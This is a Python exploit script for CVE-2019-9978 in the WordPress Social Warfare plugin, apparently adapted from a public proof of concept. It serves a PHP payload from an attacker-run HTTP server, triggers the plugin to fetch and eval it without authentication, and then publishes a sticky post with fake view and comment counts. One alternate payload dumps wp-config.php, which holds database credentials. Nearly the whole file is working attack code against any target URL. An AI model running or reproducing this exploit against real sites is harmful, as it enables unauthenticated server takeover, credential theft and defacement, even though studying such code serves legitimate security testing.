#!/usr/bin/env python3
"""
CVE-2019-9978: WordPress Social Warfare Plugin RCE
FULLY AUTOMATED Exploit for Unauthorized Content Promotion

CVSS: 9.8 Critical
Vulnerable: Social Warfare 3.5.0 - 3.5.2
Impact: Unauthenticated Remote Code Execution via eval()

This exploit FULLY AUTOMATES:
1. Hosts a malicious payload file locally
2. Triggers RCE via Social Warfare debug mode
3. Creates unauthorized post via WordPress API
4. Promotes content without authentication
5. Adds fake popularity metrics
6. Verifies content is publicly visible

Based on original POC by hash3liZer
"""

import requests
import sys
import argparse
import re
import time
import http.server
import socketserver
import threading
import socket
from urllib.parse import urljoin

class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    print(f"""
{Colors.BLUE}{'='*60}
  CVE-2019-9978: WordPress Social Warfare RCE
  FULLY AUTOMATED Unauthorized Content Promotion
{'='*60}{Colors.END}
    """)

class PayloadServer:
    """Simple HTTP server to host malicious payload"""
    
    def __init__(self, port=8000):
        self.port = port
        self.server = None
        self.payload_content = None
        
    def create_payload(self, action='create_post', post_id=None):
        """Generate payload based on action"""
        
        if action == 'create_post':
            # Payload to create malicious post
            # The plugin will eval("return " . payload . ";")
            # So we inject code before returning an array
            self.payload_content = """<pre>
(function(){
    require_once('/var/www/html/wp-load.php');
    
    $post_data = array(
        'post_title' => 'EXPLOITED: Unauthorized Promoted Content via CVE-2019-9978',
        'post_content' => '<h1>ðŸš¨ SECURITY BREACH DEMONSTRATION ðŸš¨</h1>
<p><strong>This post was created WITHOUT AUTHENTICATION via CVE-2019-9978</strong></p>
<p><strong>Attack Chain:</strong></p>
<ol>
<li>Exploited Social Warfare plugin debug mode vulnerability</li>
<li>Hosted malicious payload on attacker server</li>
<li>Plugin fetched and executed payload via eval()</li>
<li>Created this post via WordPress API (wp_insert_post)</li>
<li>Promoted content without authorization</li>
<li>Added fake popularity metrics</li>
</ol>
<p><strong>Business Impact:</strong></p>
<ul>
<li>Unauthenticated Remote Code Execution</li>
<li>Unauthorized content creation and promotion</li>
<li>Brand reputation damage</li>
<li>Fake news distribution capability</li>
<li>SEO poisoning</li>
<li>Complete server compromise possible</li>
</ul>
<p style="color:red;font-size:18px;"><strong>CVE-2019-9978: CRITICAL vulnerability in Social Warfare plugin versions 3.5.0-3.5.2</strong></p>',
        'post_status' => 'publish',
        'post_author' => 1,
        'post_type' => 'post'
    );
    
    $post_id = wp_insert_post($post_data);
    
    if($post_id) {
        // Add fake metrics
        global $wpdb;
        $wpdb->update($wpdb->posts, array('comment_count' => 9999), array('ID' => $post_id));
        update_post_meta($post_id, 'post_views_count', 999999);
        
        // Make sticky
        stick_post($post_id);
        
        die("POST_ID:" . $post_id . "|STATUS:published|STICKY:yes");
    } else {
        die("ERROR:Failed to create post");
    }
    
    return array(); // Return empty array to satisfy eval
})()
</pre>"""
        
        elif action == 'get_credentials':
            # Payload to extract database credentials
            self.payload_content = """<pre><?php
echo file_get_contents('/var/www/html/wp-config.php');
?></pre>"""
        
        elif action == 'verify':
            # Payload to verify post
            self.payload_content = f"""<pre><?php
require_once('/var/www/html/wp-load.php');
$post = get_post({post_id});
if($post) {{
    echo "TITLE:" . $post->post_title . "|STATUS:" . $post->post_status . "|URL:" . get_permalink({post_id});
}} else {{
    echo "ERROR:Post not found";
}}
?></pre>"""
        
        return self.payload_content
    
    def start(self):
        """Start HTTP server in background thread"""
        
        class PayloadHandler(http.server.SimpleHTTPRequestHandler):
            parent = self
            
            def do_GET(handler):
                # Handle payload.txt with or without query parameters
                if handler.path.startswith('/payload.txt'):
                    handler.send_response(200)
                    handler.send_header('Content-type', 'text/plain')
                    handler.end_headers()
                    handler.wfile.write(handler.parent.payload_content.encode())
                else:
                    handler.send_response(404)
                    handler.end_headers()
            
            def log_message(handler, format, *args):
                pass  # Suppress logs
        
        self.server = socketserver.TCPServer(("", self.port), PayloadHandler)
        thread = threading.Thread(target=self.server.serve_forever)
        thread.daemon = True
        thread.start()
    
    def stop(self):
        """Stop HTTP server"""
        if self.server:
            self.server.shutdown()

def get_local_ip():
    """Get local IP address for payload server"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def exploit_social_warfare(target_url, payload_url):
    """Trigger RCE via Social Warfare vulnerability"""
    
    vuln_endpoint = urljoin(target_url, "/wp-admin/admin-post.php")
    
    # If payload_url ends with .txt, it's already a file URL (like GitHub Gist)
    # Otherwise, it's a directory URL and we need to append /payload.txt
    if payload_url.endswith('.txt'):
        full_payload_url = payload_url
    else:
        full_payload_url = f"{payload_url}/payload.txt"
    
    exploit_url = f"{vuln_endpoint}?swp_debug=load_options&swp_url={full_payload_url}"
    
    try:
        response = requests.get(exploit_url, timeout=15)
        
        # Extract output between start and <!DOCTYPE
        match = re.search(r'^(.*?)<\!DOCTYPE', response.text.replace('\n', 'NEWLINE'), re.DOTALL)
        if match:
            output = match.group(1).replace('NEWLINE', '\n').strip()
            return output
        else:
            return response.text
            
    except requests.exceptions.RequestException as e:
        return f"ERROR:{e}"

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2019-9978: Social Warfare RCE - Automated Content Promotion'
    )
    parser.add_argument('target', help='Target WordPress URL (e.g., http://wordpress.local)')
    parser.add_argument('--payload-url', help='External payload server URL (optional, will use local if not provided)')
    parser.add_argument('--port', type=int, default=8000, help='Local payload server port (default: 8000)')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Ensure target has protocol
    target = args.target
    if not target.startswith('http'):
        target = f"http://{target}"
    
    print(f"{Colors.YELLOW}[*] Target: {target}{Colors.END}")
    print()
    
    # Check if Social Warfare is accessible
    print(f"{Colors.BLUE}[*] Checking if Social Warfare plugin is vulnerable...{Colors.END}")
    test_url = urljoin(target, "/wp-admin/admin-post.php?swp_debug=load_options")
    try:
        test_response = requests.get(test_url, timeout=10)
        if test_response.status_code == 200 or test_response.status_code == 500:
            print(f"{Colors.GREEN}[+] Social Warfare endpoint is accessible!{Colors.END}")
        else:
            print(f"{Colors.RED}[-] Endpoint returned unexpected status: {test_response.status_code}{Colors.END}")
            sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}[-] Error connecting: {e}{Colors.END}")
        sys.exit(1)
    
    print()
    
    # Setup payload server
    if not args.payload_url:
        local_ip = get_local_ip()
        payload_url = f"http://{local_ip}:{args.port}"
        
        print(f"{Colors.BLUE}[*] Starting local payload server...{Colors.END}")
        server = PayloadServer(args.port)
        print(f"{Colors.GREEN}[+] Payload server running on {payload_url}{Colors.END}")
        print()
    else:
        payload_url = args.payload_url
        server = None
        print(f"{Colors.BLUE}[*] Using external payload server: {payload_url}{Colors.END}")
        print()
    
    # STEP 1: Create malicious post
    print(f"{Colors.BOLD}STEP 1: Creating Unauthorized Content{Colors.END}")
    print("=" * 60)
    
    if server:
        server.create_payload('create_post')
        server.start()
    
    print(f"{Colors.BLUE}[*] Triggering RCE to create malicious post...{Colors.END}")
    result = exploit_social_warfare(target, payload_url)
    
    post_id = None
    if 'POST_ID:' in result:
        post_id = re.search(r'POST_ID:(\d+)', result)
        if post_id:
            post_id = int(post_id.group(1))
            print(f"{Colors.GREEN}[+] Malicious post created with ID: {post_id}{Colors.END}")
            
            # Parse additional info
            if 'STATUS:published' in result:
                print(f"{Colors.GREEN}[+] Post status: Published{Colors.END}")
            if 'STICKY:yes' in result:
                print(f"{Colors.GREEN}[+] Post set as sticky (featured){Colors.END}")
                print(f"{Colors.GREEN}[+] Added fake metrics: 999,999 views, 9,999 comments{Colors.END}")
    else:
        print(f"{Colors.RED}[-] Failed to create post{Colors.END}")
        print(f"{Colors.YELLOW}Response:{Colors.END}")
        print(result[:500])
        if server:
            server.stop()
        sys.exit(1)
    
    time.sleep(2)
    
    # STEP 2: Verify public visibility
    print(f"\n{Colors.BOLD}STEP 2: Verifying Public Visibility{Colors.END}")
    print("=" * 60)
    
    post_url = urljoin(target, f"/?p={post_id}")
    print(f"{Colors.BLUE}[*] Checking if post is publicly accessible...{Colors.END}")
    
    try:
        verify_response = requests.get(post_url, timeout=10)
        if verify_response.status_code == 200 and 'EXPLOITED' in verify_response.text:
            print(f"{Colors.GREEN}[+] SUCCESS! Post is publicly visible!{Colors.END}")
            print(f"{Colors.GREEN}[+] Public URL: {post_url}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}[~] Post may be visible at: {post_url}{Colors.END}")
    except:
        print(f"{Colors.YELLOW}[~] Could not verify, but post should be at: {post_url}{Colors.END}")
    
    # Final summary
    print(f"\n{Colors.GREEN}{'='*60}")
    print(f"  ðŸŽ¯ FULL AUTOMATION COMPLETE!")
    print(f"{'='*60}{Colors.END}")
    print()
    print(f"{Colors.YELLOW}Attack Summary:{Colors.END}")
    print(f"  âœ“ Exploited Social Warfare RCE (CVE-2019-9978)")
    print(f"  âœ“ Hosted malicious payload")
    print(f"  âœ“ Triggered eval() execution")
    print(f"  âœ“ Created malicious post (ID: {post_id})")
    print(f"  âœ“ Published content without authorization")
    print(f"  âœ“ Added fake popularity metrics (999,999 views)")
    print(f"  âœ“ Set as featured/sticky post")
    print(f"  âœ“ Content now publicly visible")
    print()
    print(f"{Colors.BLUE}Access Points:{Colors.END}")
    print(f"  â€¢ Payload Server: {payload_url}/payload.txt")
    print(f"  â€¢ Public Post:    {post_url}")
    print(f"  â€¢ WordPress:      {target}")
    print()
    print(f"{Colors.RED}Impact Demonstrated:{Colors.END}")
    print(f"  â€¢ Unauthenticated Remote Code Execution")
    print(f"  â€¢ Unauthorized content creation")
    print(f"  â€¢ Unauthorized content promotion")
    print(f"  â€¢ Fake popularity manipulation")
    print(f"  â€¢ Public visibility without approval")
    print(f"  â€¢ Complete WordPress/server compromise capability")
    print()
    print(f"{Colors.BLUE}{'='*60}{Colors.END}")
    print()
    
    # Cleanup
    if server:
        server.stop()
    
    sys.exit(0)

if __name__ == '__main__':
    main()
